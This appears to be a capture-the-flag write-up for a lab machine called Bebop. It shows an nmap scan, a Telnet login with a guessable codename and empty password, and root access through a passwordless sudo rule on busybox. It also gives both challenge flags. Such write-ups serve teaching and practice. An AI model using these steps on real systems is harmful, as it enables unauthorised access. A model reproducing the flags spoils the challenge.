# Bebop CTF Writeup

- **Target IP**: 10.48.189.127
- **Date**: March 27, 2026
- **Codename**: pilot

---

## 1. Enumeration

### Nmap Scan Results
An initial Nmap scan was performed to identify open ports and services:

```bash
nmap -sC -sV 10.48.189.127
```

**Output Snippet:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
23/tcp open  telnet  BSD-derived telnetd
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

The scan revealed a **FreeBSD** system with **SSH** and **Telnet** services exposed.

---

## 2. Initial Access

### Telnet Login
Based on the hint provided ("For this mission, you have been assigned the codename 'pilot'"), I attempted a Telnet login using `pilot` as both the username and password.

```bash
telnet 10.48.189.127
# login: pilot
# Password: (no password just hit Enter)
```

Login was successful, providing a shell as the user `pilot`.

### User Flag
The user flag was located in the home directory:

```bash
[pilot@freebsd ~]$ cat user.txt
THM{r3m0v3_b3f0r3_fl16h7}
```

---

## 3. Privilege Escalation

### Sudo Privileges
Checking the user's sudo privileges:

```bash
[pilot@freebsd ~]$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
```

The user `pilot` can run `busybox` as root without a password.

### Exploitation
`busybox` has a `sh` applet that can be used to spawn a root shell.

```bash
[pilot@freebsd ~]$ sudo /usr/local/bin/busybox sh
# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
```

### Root Flag
With root access, the flag was found in `/root/root.txt`:

```bash
# cat /root/root.txt
THM{h16hw4y_70_7h3_d4n63r_z0n3}
```

---

## 4. Summary

- **User**: pilot
- **Password**: (no password just hit Enter)
- **Vector**: Telnet -> sudo (BusyBox) -> Root
- **User Flag**: `THM{r3m0v3_b3f0r3_fl16h7}`
- **Root Flag**: `THM{h16hw4y_70_7h3_d4n63r_z0n3}`
